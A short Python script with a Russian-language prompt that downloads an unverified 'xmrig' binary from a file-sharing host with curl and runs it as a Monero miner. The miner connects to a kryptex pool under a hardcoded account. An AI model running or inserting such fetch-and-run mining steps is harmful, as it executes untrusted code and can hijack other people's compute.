import subprocess
import os

print("Введите имя воркера")
name = input()
os.system('curl -Lo xmrig https://file.mom/files/rnwc8gejsc.xmrig')
os.system('chmod +x xmrig')
subprocess.run(['./xmrig', '-o', 'xmr.kryptex.network:8888', '-u', f'pimik@send-email.pro/{name}', '--tls', '-k', '--coin', 'monero', '-a', 'rx/0'])
